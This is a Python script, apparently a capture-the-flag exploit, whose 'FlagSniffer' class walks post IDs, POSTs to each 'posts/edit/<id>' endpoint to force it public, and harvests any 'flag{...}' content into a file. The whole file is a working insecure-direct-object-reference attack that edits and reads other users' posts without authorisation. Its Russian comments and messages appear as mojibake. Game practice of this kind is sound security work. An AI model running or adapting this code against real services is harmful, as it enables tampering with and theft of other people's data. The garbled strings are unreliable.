from bs4 import BeautifulSoup

ID_CHECK_DEPTH = 8

class FlagSniffer:


    def __init__(self, session, url, flags_file, headers):
        self.session = session
        self.url = url
        self.flags_file = flags_file
        self.headers = headers


    def sniff(self):

        f = open(self.flags_file, "r+")
        old_flags = {i.strip() for i in f.readlines()}
        
        new_flags = set()
       

        url_posts = self.url + "posts/edit/"    
        data = {"visibility": "public"}
        print("–ù–∞—á–∞–ª –ø—Ä–æ–≤–µ—Ä—è—Ç—å ID'—à–Ω–∏–∫–∏...")
        do_not_exist_number = 0
        for id in range(0, 100):
            post_id_request = self.session.post(url_posts+str(id), data, headers=self.headers)
            if post_id_request.status_code == 200:
                # —Å–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫ –Ω–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö ID
                do_not_exist_number = 0
                                
                # –ü–∞—Ä—Å–∏–º JSON –æ—Ç–≤–µ—Ç
                json_data = post_id_request.json()
                

                # –ò–∑–≤–ª–µ–∫–∞–µ–º –∫–æ–Ω—Ç–µ–Ω—Ç –∏–∑ JSON
                content = json_data.get("post", {}).get("content", "")
                
                # –ò—â–µ–º —Ñ–ª–∞–≥ –≤ —Ñ–æ—Ä–º–∞—Ç–µ flag{...}
                if content.startswith("flag{"):
                    new_flags.add(content)
                       
            else:
                do_not_exist_number += 1
                if do_not_exist_number >= ID_CHECK_DEPTH:
                    print(f"{ID_CHECK_DEPTH} –ø–æ–¥—Ä—è–¥ ID'—à–Ω–∏–∫–æ–≤ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É—é—Ç, –ø—Ä–µ–∫—Ä–∞—â–∞—é –ø–æ–∏—Å–∫...")
                    break
            
        flags = new_flags.difference(old_flags)

        # –î–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—ã–µ —Ñ–ª–∞–≥–∏ –≤ —Ñ–∞–π–ª
        for i in flags:
            f.write(i+"\n")
        
        f.close()
        flag_length = len(flags) 
        if flag_length > 0:
            print(f"–Ø –Ω–∞—à–µ–ª –Ω–æ–≤—ã–µ —Ñ–ª–∞–≥–∏! –ò—Ö —Ü–µ–ª—ã—Ö {flag_length} —à—Ç—É–∫")        
        if flag_length == 0:
            print('–ù–æ–≤—ã—Ö —Ñ–ª–∞–≥–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ üò≠')
        return flags
    